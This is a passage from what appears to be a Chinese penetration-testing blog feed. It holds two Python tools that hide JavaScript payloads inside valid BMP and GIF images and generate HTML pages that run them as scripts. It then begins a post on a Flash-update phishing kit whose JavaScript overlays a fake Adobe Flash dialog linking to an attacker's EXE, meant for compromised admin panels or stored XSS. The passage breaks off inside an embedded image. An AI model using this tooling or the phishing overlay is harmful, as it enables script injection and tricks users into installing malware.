fname</span>):</span></span><br><span class="line">	<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">	Generates a fake but valid BMP within scriting</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span></span><br><span class="line">	f = <span class="built_in">open</span>(fname, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">	header = (<span class="string">b&#x27;\x42\x4D&#x27;</span>  <span class="comment">#Signature BM</span></span><br><span class="line">						<span class="string">b&#x27;\x2F\x2A\x00\x00&#x27;</span> <span class="comment">#Header File size, but encoded as /* &lt;-- Yes it&#x27;s a valid header </span></span><br><span class="line">						<span class="string">b&#x27;\x00\x00\x00\x00&#x27;</span> <span class="comment">#Reserved</span></span><br><span class="line">						<span class="string">b&#x27;\x00\x00\x00\x00&#x27;</span> <span class="comment">#bitmap data offset</span></span><br><span class="line">						<span class="string">b&#x27;&#x27;</span>+ _hexify( <span class="built_in">len</span>(payload) ) + <span class="comment">#bitmap header size</span></span><br><span class="line">					  <span class="string">b&#x27;\x00\x00\x00\x14&#x27;</span> <span class="comment">#width 20pixel .. it&#x27;s up to you</span></span><br><span class="line">						<span class="string">b&#x27;\x00\x00\x00\x14&#x27;</span> <span class="comment">#height 20pixel .. it&#x27;s up to you</span></span><br><span class="line">					  <span class="string">b&#x27;\x00\x00&#x27;</span> <span class="comment">#nb_plan	</span></span><br><span class="line">						<span class="string">b&#x27;\x00\x00&#x27;</span> <span class="comment">#nb per pixel</span></span><br><span class="line">						<span class="string">b&#x27;\x00\x10\x00\x00&#x27;</span> <span class="comment">#compression type</span></span><br><span class="line">						<span class="string">b&#x27;\x00\x00\x00\x00&#x27;</span> <span class="comment">#image size .. its ignored</span></span><br><span class="line">						<span class="string">b&#x27;\x00\x00\x00\x01&#x27;</span> <span class="comment">#Horizontal resolution</span></span><br><span class="line">						<span class="string">b&#x27;\x00\x00\x00\x01&#x27;</span> <span class="comment">#Vertial resolution</span></span><br><span class="line">						<span class="string">b&#x27;\x00\x00\x00\x00&#x27;</span> <span class="comment">#number of colors</span></span><br><span class="line">						<span class="string">b&#x27;\x00\x00\x00\x00&#x27;</span> <span class="comment">#number important colors</span></span><br><span class="line">						<span class="string">b&#x27;\x00\x00\x00\x80&#x27;</span> <span class="comment">#palet colors to be complient</span></span><br><span class="line">						<span class="string">b&#x27;\x00\x80\xff\x80&#x27;</span> <span class="comment">#palet colors to be complient</span></span><br><span class="line">						<span class="string">b&#x27;\x80\x00\xff\x2A&#x27;</span> <span class="comment">#palet colors to be complient</span></span><br><span class="line">						<span class="string">b&#x27;\x2F\x3D\x31\x3B&#x27;</span> <span class="comment">#*/=1;</span></span><br><span class="line">						)</span><br><span class="line">	<span class="comment"># I made this explicit, step by step .</span></span><br><span class="line">	f.write(header)</span><br><span class="line">	f.write(payload)</span><br><span class="line">	f.close()</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_generate_launching_page</span>(<span class="params">f</span>):</span></span><br><span class="line">	<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">	Creates the HTML launching page</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">	htmlpage =<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">								&lt;html&gt;</span></span><br><span class="line"><span class="string">								&lt;head&gt;&lt;title&gt;Opening an image&lt;/title&gt; &lt;/head&gt;</span></span><br><span class="line"><span class="string">								&lt;body&gt;</span></span><br><span class="line"><span class="string">									&lt;img src=\&quot;&quot;&quot;&quot;</span> + f + <span class="string">&quot;&quot;&quot;\&quot;\&gt;</span></span><br><span class="line"><span class="string">									&lt;script src= \&quot;&quot;&quot;&quot;</span> + f + <span class="string">&quot;&quot;&quot;\&quot;&gt; &lt;/script&gt;</span></span><br><span class="line"><span class="string">								&lt;/body&gt;</span></span><br><span class="line"><span class="string">								&lt;/html&gt;</span></span><br><span class="line"><span class="string">						&quot;&quot;&quot;</span></span><br><span class="line">	html = <span class="built_in">open</span>(<span class="string">&quot;run.html&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">	html.write(htmlpage);</span><br><span class="line">	html.close()</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_inject_into_file</span>(<span class="params">payload, fname</span>):</span></span><br><span class="line">	<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">	Injects the payload into existing BMP</span></span><br><span class="line"><span class="string">	NOTE: if the BMP contains \xFF\x2A might caouse issues</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span></span><br><span class="line">	<span class="comment"># I know, I can do it all in memory and much more fast.</span></span><br><span class="line">	<span class="comment"># I wont do it here.</span></span><br><span class="line">	f = <span class="built_in">open</span>(fname, <span class="string">&quot;r+b&quot;</span>)</span><br><span class="line">	b = f.read()</span><br><span class="line">	b.replace(<span class="string">b&#x27;\x2A\x2F&#x27;</span>,<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">	f.close()</span><br><span class="line"></span><br><span class="line">	f = <span class="built_in">open</span>(fname, <span class="string">&quot;w+b&quot;</span>)</span><br><span class="line">	f.write(b)</span><br><span class="line">	f.seek(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">	f.write(<span class="string">b&#x27;\x2F\x2A&#x27;</span>)</span><br><span class="line">	f.close()</span><br><span class="line"></span><br><span class="line">	f = <span class="built_in">open</span>(fname, <span class="string">&quot;a+b&quot;</span>)</span><br><span class="line">	f.write(<span class="string">b&#x27;\xFF\x2A\x2F\x3D\x31\x3B&#x27;</span>)</span><br><span class="line">	f.write(payload)</span><br><span class="line">	f.close()</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	parser = argparse.ArgumentParser()</span><br><span class="line">	parser.add_argument(<span class="string">&quot;filename&quot;</span>,<span class="built_in">help</span>=<span class="string">&quot;the bmp file name to be generated/or infected&quot;</span>)</span><br><span class="line">	parser.add_argument(<span class="string">&quot;js_payload&quot;</span>,<span class="built_in">help</span>=<span class="string">&quot;the payload to be injected. For exmample: \&quot;alert(\&quot;test\&quot;);\&quot;&quot;</span>)</span><br><span class="line">	parser.add_argument(<span class="string">&quot;-i&quot;</span>, <span class="string">&quot;--inject-to-existing-bmp&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;inject into the current bitmap&quot;</span>)</span><br><span class="line">	args = parser.parse_args()</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">					|======================================================================================================|</span></span><br><span class="line"><span class="string">					| [!] legal disclaimer: usage of this tool for injecting malware to be propagated is illegal.          |</span></span><br><span class="line"><span class="string">					| It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws.            |</span></span><br><span class="line"><span class="string">					| Authors assume no liability and are not responsible for any misuse or damage caused by this program  |</span></span><br><span class="line"><span class="string">					|======================================================================================================|</span></span><br><span class="line"><span class="string">					&quot;&quot;&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> args.inject_to_existing_bmp:</span><br><span class="line">		 _inject_into_file(args.js_payload, args.filename)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		_generate_and_write_to_file(args.js_payload, args.filename)</span><br><span class="line">	</span><br><span class="line">	_generate_launching_page(args.filename)</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;[+] Finished!&quot;</span></span><br></pre></td></tr></table></figure>



<p>gifxss</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment">#============================================================================================================#</span></span><br><span class="line"><span class="comment">#======= Simply injects a JavaScript Payload into a GIF. ====================================================#</span></span><br><span class="line"><span class="comment">#======= or it creates a JavaScript Payload as a GIF.    ====================================================#</span></span><br><span class="line"><span class="comment">#======= The resulting GIF must be a valid (not corrupted) GIF. =============================================#</span></span><br><span class="line"><span class="comment">#======= Author: marcoramilli.blogspot.com ==================================================================#</span></span><br><span class="line"><span class="comment">#======= Version: PoC (don&#x27;t even think to use it in development env.) ======================================#</span></span><br><span class="line"><span class="comment">#======= Disclaimer: ========================================================================================#</span></span><br><span class="line"><span class="comment">#THIS IS NOT PEP3 FORMATTED</span></span><br><span class="line"><span class="comment">#THIS SOFTWARE IS PROVIDED BY THE AUTHOR &quot;AS IS&quot; AND ANY EXPRESS OR</span></span><br><span class="line"><span class="comment">#IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED</span></span><br><span class="line"><span class="comment">#WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE</span></span><br><span class="line"><span class="comment">#DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,</span></span><br><span class="line"><span class="comment">#INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES</span></span><br><span class="line"><span class="comment">#(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR</span></span><br><span class="line">								<span class="comment">#SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)</span></span><br><span class="line">								<span class="comment">#HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,</span></span><br><span class="line"><span class="comment">#STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING</span></span><br><span class="line"><span class="comment">#IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE</span></span><br><span class="line"><span class="comment">#POSSIBILITY OF SUCH DAMAGE.</span></span><br><span class="line"><span class="comment">#===========================================================================================================#</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_hexify</span>(<span class="params">num</span>):</span></span><br><span class="line">	<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">	Converts and formats to hexadecimal</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span></span><br><span class="line">	num = <span class="string">&quot;%x&quot;</span> % num</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(num) % <span class="number">2</span>:</span><br><span class="line">		num = <span class="string">&#x27;0&#x27;</span>+num</span><br><span class="line">	<span class="keyword">return</span> num.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_generate_and_write_to_file</span>(<span class="params">payload, fname</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Generates a fake but valid GIF within scriting</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    f = <span class="built_in">open</span>(fname, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">    header = (<span class="string">b&#x27;\x47\x49\x46\x38\x39\x61&#x27;</span>  <span class="comment">#Signature + Version  GIF89a</span></span><br><span class="line">                        <span class="string">b&#x27;\x2F\x2A&#x27;</span> <span class="comment">#Encoding /* it&#x27;s a valid Logical Screen Width</span></span><br><span class="line">                        <span class="string">b&#x27;\x0A\x00&#x27;</span> <span class="comment">#Smal Logical Screen Height</span></span><br><span class="line">                        <span class="string">b&#x27;\x00&#x27;</span> <span class="comment">#GCTF</span></span><br><span class="line">                        <span class="string">b&#x27;\xFF&#x27;</span> <span class="comment">#BackgroundColor</span></span><br><span class="line">                        <span class="string">b&#x27;\x00&#x27;</span> <span class="comment">#Pixel Ratio</span></span><br><span class="line">                        <span class="string">b&#x27;\x2C\x00\x00\x00\x00\x2F\x2A\x0A\x00\x00\x02\x00\x3B&#x27;</span> <span class="comment">#GlobalColorTable + Blocks</span></span><br><span class="line">                        <span class="string">b&#x27;\x2A\x2F&#x27;</span> <span class="comment">#Commenting out */</span></span><br><span class="line">                        <span class="string">b&#x27;\x3D\x31\x3B&#x27;</span> <span class="comment"># enable the script side by introducing =1;</span></span><br><span class="line">				        )</span><br><span class="line">    trailer = <span class="string">b&#x27;\x3B&#x27;</span></span><br><span class="line">	<span class="comment"># I made this explicit, step by step .</span></span><br><span class="line">    f.write(header)</span><br><span class="line">    f.write(payload)</span><br><span class="line">    f.write(trailer)</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_generate_launching_page</span>(<span class="params">f</span>):</span></span><br><span class="line">	<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">	Creates the HTML launching page</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span></span><br><span class="line">	htmlpage =<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">								&lt;html&gt;</span></span><br><span class="line"><span class="string">								&lt;head&gt;&lt;title&gt;Opening an image&lt;/title&gt; &lt;/head&gt;</span></span><br><span class="line"><span class="string">								&lt;body&gt;</span></span><br><span class="line"><span class="string">									&lt;img src=\&quot;&quot;&quot;&quot;</span> + f + <span class="string">&quot;&quot;&quot;_malw.gif\&quot;\&gt;</span></span><br><span class="line"><span class="string">									&lt;script src= \&quot;&quot;&quot;&quot;</span> + f + <span class="string">&quot;&quot;&quot;_malw.gif\&quot;&gt; &lt;/script&gt;</span></span><br><span class="line"><span class="string">								&lt;/body&gt;</span></span><br><span class="line"><span class="string">								&lt;/html&gt;</span></span><br><span class="line"><span class="string">			  &quot;&quot;&quot;</span></span><br><span class="line">	html = <span class="built_in">open</span>(<span class="string">&quot;run.html&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">	html.write(htmlpage);</span><br><span class="line">	html.close()</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_inject_into_file</span>(<span class="params">payload, fname</span>):</span></span><br><span class="line">	<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">	Injects the payload into existing GIF</span></span><br><span class="line"><span class="string">	NOTE: if the GIF contains \xFF\x2A and/or \x2A\x5C might caouse issues</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span></span><br><span class="line">	<span class="comment"># I know, I can do it all in memory and much more fast.</span></span><br><span class="line">	<span class="comment"># I wont do it here.</span></span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(fname + <span class="string">&quot;_malw.gif&quot;</span>, <span class="string">&quot;w+b&quot;</span>) <span class="keyword">as</span> fout:</span><br><span class="line">		<span class="keyword">with</span> <span class="built_in">open</span>(fname, <span class="string">&quot;rt&quot;</span>) <span class="keyword">as</span> fin:</span><br><span class="line">			<span class="keyword">for</span> line <span class="keyword">in</span> fin:</span><br><span class="line">				ls1 = line.replace(<span class="string">b&#x27;\x2A\x2F&#x27;</span>, <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">				ls2 = ls1.replace(<span class="string">b&#x27;\x2F\x2A&#x27;</span>, <span class="string">b&#x27;\x00\x00&#x27;</span>)				</span><br><span class="line">				fout.write(ls2)	            	</span><br><span class="line">		fout.seek(<span class="number">6</span>,<span class="number">0</span>)</span><br><span class="line">		fout.write(<span class="string">b&#x27;\x2F\x2A&#x27;</span>) <span class="comment">#/*</span></span><br><span class="line"></span><br><span class="line">	f = <span class="built_in">open</span>(fname + <span class="string">&quot;_malw.gif&quot;</span>, <span class="string">&quot;a+b&quot;</span>) <span class="comment">#appending mode</span></span><br><span class="line">	f.write(<span class="string">b&#x27;\x2A\x2F\x3D\x31\x3B&#x27;</span>)</span><br><span class="line">	f.write(payload)</span><br><span class="line">	f.write(<span class="string">b&#x27;\x3B&#x27;</span>)</span><br><span class="line">	f.close()</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	parser = argparse.ArgumentParser()</span><br><span class="line">	parser.add_argument(<span class="string">&quot;filename&quot;</span>,<span class="built_in">help</span>=<span class="string">&quot;the gif file name to be generated/or infected&quot;</span>)</span><br><span class="line">	parser.add_argument(<span class="string">&quot;js_payload&quot;</span>,<span class="built_in">help</span>=<span class="string">&quot;the payload to be injected. For exmample: \&quot;alert(\&quot;test\&quot;);\&quot;&quot;</span>)</span><br><span class="line">	parser.add_argument(<span class="string">&quot;-i&quot;</span>, <span class="string">&quot;--inject-to-existing-gif&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;inject into the current gif&quot;</span>)</span><br><span class="line">	args = parser.parse_args()</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">					|======================================================================================================|</span></span><br><span class="line"><span class="string">					| [!] legal disclaimer: usage of this tool for injecting malware to be propagated is illegal.          |</span></span><br><span class="line"><span class="string">					| It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws.            |</span></span><br><span class="line"><span class="string">					| Authors assume no liability and are not responsible for any misuse or damage caused by this program  |</span></span><br><span class="line"><span class="string">					|======================================================================================================|</span></span><br><span class="line"><span class="string">					&quot;&quot;&quot;</span></span><br><span class="line">         )</span><br><span class="line">	<span class="keyword">if</span> args.inject_to_existing_gif:</span><br><span class="line">		 _inject_into_file(args.js_payload, args.filename)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		_generate_and_write_to_file(args.js_payload, args.filename)</span><br><span class="line"></span><br><span class="line">	_generate_launching_page(args.filename)</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;[+] Finished!&quot;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-penetration</category>
      </categories>
  </entry>
  <entry>
    <title>欢迎━(*｀∀´*)ノ亻!</title>
    <url>/2021/12/27/hello-world/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>flash钓鱼+inno 打包flash安装包</title>
    <url>/2022/12/06/flash%E9%92%93%E9%B1%BC-inno-%E6%89%93%E5%8C%85flash%E5%AE%89%E8%A3%85%E5%8C%85/</url>
    <content><![CDATA[<h1 id="flash钓鱼-inno-打包flash安装包"><a href="#flash钓鱼-inno-打包flash安装包" class="headerlink" title="flash钓鱼+inno 打包flash安装包"></a>flash钓鱼+inno 打包flash安装包</h1><p>复现一款从大佬那拿到的一个flash钓鱼套餐。</p>
<p>该套餐适用于能改变后台前端页面代码的时候进行钓鱼，比如进入宝塔后台。</p>
<p>或者有存储xss的地方也可以打一打</p>
<h1 id="两个js"><a href="#两个js" class="headerlink" title="两个js"></a>两个js</h1><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>这两个js是提示更新flash的js函数，代码如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> timeout = <span class="number">1</span>;<span class="keyword">var</span> url = <span class="string">&#x27;EXE地址&#x27;</span>;<span class="keyword">var</span> body = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;body&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> str = <span class="string">&#x27;&lt;div style=&quot;width:100%;height:100%;left:0;top:0;position:fixed;background:rgba(0,0,0,0.3);&quot;&gt; &lt;div style=&quot;position:absolute;left:50%;top:50%;&quot;&gt;&lt;div style=&quot;width:500px;height:280px;position:absolute;left:-250px;top:-250px; &quot;&gt;&lt;div style=&quot;height:60px;background-image: linear-gradient(to right bottom , #9d000f,#a91928,#93212c);border-radius: 8px 8px 0 0;&quot;&gt;&lt;img style=&quot;margin-top: 7px;margin-left: 8px;float:left;&quot; src=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAC6UlEQVRoQ82aTYiNURjHf/+sJBRFNAtSqFFiQZqNWZAFypRsTc3Cwihf5auMMhsLFkayGISkWSCzM8VEI4VYkpCQEgslK3l06r1ijLnnOe/XPXV7F/d/7v39znnuPec994oWbWbWAWwGlgBLs+t74ANwQNJoQFcr8ZvZBmAd0AUsmISts6UEzKwd2AdsjxzQ1hAws6kZ+F5gZiR8iNUvYGYrgEEgXL2tXoHsA3oZWOglz/L1CZhZ+JBeAeYkwtdXQmYWvhavAtNywNcjYGZrgbs5wRvdqy8hMwvwQSKlfQQeAq+Bl8CLStcBMzsK9DnJvwPngFsN2In6l74SJ5bOE2C3pPvNpKsQ8JbONaBX0udm8KXvhRJKZ0BSbwx4I1PaDJjZcuCZA8YNX+oMmNnJUMeRAu+ADknh6mqlzICZtWWjPzuSJtT8QGT2r1hZAoeB45FAI5LWR2b/iRUukG2RQ+0vjoTqknQjMluJwA7gbCTQA+B2s6ykY//LlDEDAWpNMyjH832VCZjZVmDIARcTrVRgGNgYQ+XIVCNgZp3AHQdYbLQygQuOU4VY+JArX8DMlmUL1xQPWWS2EoETwP5IIG+sXAEzmwc8BeZ6ySLzpQt47rbeAm8iwRux0dLWgWz0HwPzI6F6JIXDrMJarpXYecPySVLhZZYsYGaLgHuO0U/eMk82XXkErgNbImvhG9Am6WtkPjqWJOAsnQDTL+lINJUj6BZI2LD9BNolPXdwRUddAgnwAeSUpD3RRM5gtICZdQPnna//SNIqZx9XvKmAma0Gwi8oYa/vbSslhVW6tPZbIDsCnA7MyB6zgE1AEEhpuySdTuno6TNeoKjj7yFJ2zwgqdkyBAYl9aQCefsVLbBT0hkvRJ58kQLdki7mgUnpW4RAWKAOSrqZApC3T16BS8AhSeH/C7W0VIFX2Qpbab1PNEIegS/h9yognP0MS/pRy5CPe9PxAiNA2PL++RgDwnHhWBnb4byD8AvyqgxAqeMmZQAAAABJRU5ErkJggg==&quot;&gt;&lt;div style=&quot;float: left;margin-top: 38px;color: #ddd9d9;&quot;&gt; ADOBE FLASH PLYAER &lt;/div&gt; &lt;/div&gt;&lt;div style=&quot;height:200px;background:white;border-radius: 0 0 8px 8px;&quot;&gt;&lt;div style=&quot;padding: 20px 56px 0 26px;font-size: 18px;font-weight: 400;&quot;&gt;&lt;img style=&quot;width:450px&quot; src=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAyAAAABGCAYAAAA0NfCyAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAIGNIUk0AAHolAACAgwAA+f8AAIDpAAB1MAAA6mAAADqYAAAXb5JfxUYAABq6SURBVHja7J37daO808cnv7MN8JbAUwJbAimBLYGUQEqwS7BLsEvAJdglhBLWJeT9Y9HxZKLLSAhsnO/nHM5e4mCQRnOTNHr5/PwkAAAAAAAAAFiC/6EJAAAAAAAAAAhAAAAAAAAAAAhAAAAAAAAAAAABCAAAAAAAAAABCAAAAAAAAAAgAAEAAAAAAAAgAAEAAAAAAAAgAAEAAAAAAAAABCAAAAAAAAAABCAAAAAAAAAAgAAEAAAAAAAAgAAEAAAAAAAAgAAEAAAAAAAAABCAAAAAAAAAABCAAAAAAAAAAAACEAAAAAAAAMAD8CvHTV5eXtCSAIAlKYnoOl4APBo1+/sFcgoejGaUywFNsV4+Pz/X/wJTL6WzcB6F3kUnlPacVES0Gf+MYTM+ZwHRfzpnth6vnH07l5x8smstVETUs2sqm/H9D0TUQoSzc2YyBn03bYzOaddqhx2rR1vVZR4fzQ8LIk0f/n2Sd+rYO3UZdXs36vUP2OB1+e/3vH4t1E7G2T8Q0ZGI/liExDj2JyJ6H6PzOR1Oo5wHIvovUtlvxmfcws6uipZumfM93bKSzdinRESvowymylU1XvX47/9bubHi7TTVEOR0xGrWd6dMOqEZ/3x7Ejl/n3CPq+Pv4DFoxn6ux/55FTazZDrtNI7jHN95GO+3zTTu1kKMP+IKCnM8w9Q2v4rn1Pow5XiZgKNgds6mf/awwSDEEgFIzbImV4fAtyxSLWj+acGS/V0r6IVQKheIz+ooWNaHK/OLQoZlxoeEMq49Tvx2he10YAo8h0N+yTx+TR8Mic5VzYxqY9EJxxUHjRvWj48STB1o3pmU04ONs0HIVC65b5gTx8drT/8SaVf2/XPYcvOndIZzON3bCNmeypzrxquMz8l5zxCAnBx2zNfnsTPWm1F/XmGDwT0DEOPIGP5YBI1naq7jZ+bOuHHh1TovdeZMBFgPqUuGBqYc15RF5ssh20wOec73rx3jtxJObmX5nUrhCG/Gd15j5n8/OqkV3ZbevE105DTLDEIOXe4ZMIk20DJOfEzgfEoc+6XF6UuxVTXrU9fYOo2fmytwLsifSJzqdK814NcEDVN1XR0ZVBoZHwI6zPTpVfxuMfbHYPHXruz/LiLgnXPW9KfZYE0QNtDK9/DMHYDwrNebQxHvhBFZokFL1oGXhM7fz/RclVA4ZpBfIhwibmDXHCjx9alzZC+Gib87WP5uU8xrZEtfM5o7eqwNi43DcdkkOrkX5sQRrXt20yzH6QNByNJcHM54yZ7xFKGv+CzAPtI5i3GUc2SdY22AXELic9qPCznvfJXCe0C/nYTTd/H0RUyQdvXISDN+317R/6Xj33M4dDlsVx3p1MfI+MEzXmVQcRp1C2zw/XyiWuimVc/szBmAcGdg61AMskEPE77vvwiBriKUnk0JHGdqr87zvVph48pnaeOZuz0eJQC50m1/0is9P9fRYe3H9y7GIOQR3r1kY0IGRYPDGZL9aH7/lZ5zJlP2Xzu2zZY5rhfF+KtYO03l3aNXeQASq+Pm0g9LU7H+0rCk7Basjy4OW74V/dDTbanWq8f5jQlA9p4Ao2NjOyaR2Qh7mVuWpm70rul5gQ3Ok9RBAGLJlnRCeGwKN1cVhpgMWOVwTkK/U7J3aZUDRjtTssnYFmCegV7/wHfeMuNsqups2ZiYsqa/dhik0Dh2zX5Ig/bicQjqH9J/f+i2dIEXFNC08zVBTy5Fl6j7bcHpq+P+mzv3F39Gc23uJLt8tund8rNLojNURYz70PMVQk89yt6nzR2+c6D0Qj7F2NePtrTnJ9rgp2eOAKSlr8uqXELOl2elDJaWOSNH5edIOE2uEoVHETzwz2inN7WVR0pmUM0emJP4OQbec5JSClqSsjb2Qrq1yVv6uva8ZQHIVGfI9tyaDGQr3gP4ddD7qF9eRVAh9aLLOdTIWK6qhRqnpxDPvdTsRx147tCz84DdtSzJ9Fcx/vwR9kXwTcNHSzC6GT/zTnEV8wrKs0emsASkb+Lnu/H/Q98zhz7JuQckZhxtmf/QeMZKOY5vMyu61r1vz2qDEYDMEHz0IqMSa0T4MoohoFh8mx8rj+F2Gbw5DZtNSaZW+QGPT5UhuJw7OH2jf2dCHOn+WUVZ/QfogkibYxizKTz0uSkzYbw/r0oZKJi+XCpTO+Xsmk+LfXn19NcjsaPbXo53T180kc+eq6Ik1wkXoaNaFiBVRPT7Ds51zj0gqQ622Whu0wOmAqCZIX3WYgBrtsF8nDxVMjpnAMKDD+M0bxzBR8UMyDagtG3KuhFGSIvPYPHNkD6DFxqgsYaqiDTA4LnQZv/KgPM916a7y2i4pZNgsqExzgMfG68WZyR0ry7T+/w0bHIR2gcSswdkSpvG6D+Z7UZpzfkDfp49HzzjMTY5kbIU2ub48QqarxYZ3zD9uaPvZ5A9cuAqA/Qqoa1OzF9qLWOGVzb7qRn5R7fBLv24+v2LuQKQmgUfRhGUDqVTsMZLzaiaTEcVGYAcPZ1WewIQ8ihh8LOyJbEG5TXxZ5IDhSvizOWQXRzBfC6lr1GkmP3IS2jZ0FJ7QMqIQEZWYlpSF79HBl+2AK5SBlqPEnzsPLqlY323TQhCa6Uc+nSxLPF/tcjwG/tcM15LZvnvnbHes76SAQg/T2m/Ern8qTb4KckVgJhgYjN2qOsQphP9y6bKg2E60pWMNTMoe1pmWRJXsktO94P5cZ1tILP0cjleHTkucsCXAQ4Wp62i+CUQawNFGvxOfOkJJC6Wz14p32yQSSylOJNlxBjge+WWXpYaO7ZsAdxpRfK0E/8+k33J8pCod+oJbVLT9z2kJ49TeGT6c4mS4keaZ6Z1mPA8paWNfAU9pjr/R8UYhQ1GAJI10j4qomg51cenUbfknwY0y7d27Dvn4qdP9/OT36dWKcl5L3m/JY26eXZeGtnGxuKETEHOwu2EoudnB9xjiVEzjpXfM92fz35cKd+J2hU9RxleXkrUZoBflZ+NdRQkKfv5KuHoDp4AtGDj/2/iM1wUzsxPn2kz+yprSx/Z2jtWz9XCH6gtfXR1/J6sYmf8jlr0q2tv0RIlxe99QFzv0RONY+zZdMKrxe5qnf/TzG37E23w0y3R/3XnBpInpYc6bs86fu4gZEf5NzuGyjtuPIpgCUfJrBO1LXcx559ol6HlvJd0dCuLsoutxKMxQBeL8tsz5Webtq4j5DlGbni7SeW3YUpyykbxPqBAbXugevp6avp+BpnkxmRPutkQ12dKR1+59BkKQMxHKYJJl2MYU7L9qOhTft/+zm1glpVdlGOBFEGB/Lkv0Cocsm6cen7w31W